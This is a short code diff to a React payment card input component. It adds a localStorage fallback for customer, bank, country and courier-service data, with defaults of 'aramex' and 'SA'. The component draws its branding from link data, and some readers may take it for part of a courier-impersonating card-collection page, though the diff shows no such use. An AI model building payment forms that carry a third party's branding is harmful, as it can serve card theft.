@@ -30,16 +30,20 @@ const PaymentCardInput = () => {
   const [cardValid, setCardValid] = useState<boolean | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  // Get customer info and selected bank from link data (cross-device compatible)
-  const customerInfo = linkData?.payload?.customerInfo || {};
-  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
-  const selectedBankId = linkData?.payload?.selectedBank || '';
+  // Fallback to localStorage if linkData is not available
+  const localData = id ? localStorage.getItem(`payment_${id}`) : null;
+  const localPayload = localData ? JSON.parse(localData) : null;
 
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
-  const serviceName = linkData?.payload?.service_name || serviceKey;
+  // Get customer info and selected bank from link data or localStorage (cross-device compatible)
+  const customerInfo = linkData?.payload?.customerInfo || localPayload?.customerInfo || {};
+  const selectedCountry = linkData?.payload?.selectedCountry || localPayload?.selectedCountry || "SA";
+  const selectedBankId = linkData?.payload?.selectedBank || localPayload?.selectedBank || '';
+
+  const serviceKey = linkData?.payload?.service_key || localPayload?.service_key || customerInfo.service || 'aramex';
+  const serviceName = linkData?.payload?.service_name || localPayload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
 
-  const shippingInfo = linkData?.payload as any;
+  const shippingInfo = (linkData?.payload || localPayload) as any;
 
   // Get amount from link data - ensure it's a number, handle all data types
   const rawAmount = shippingInfo?.cod_amount;
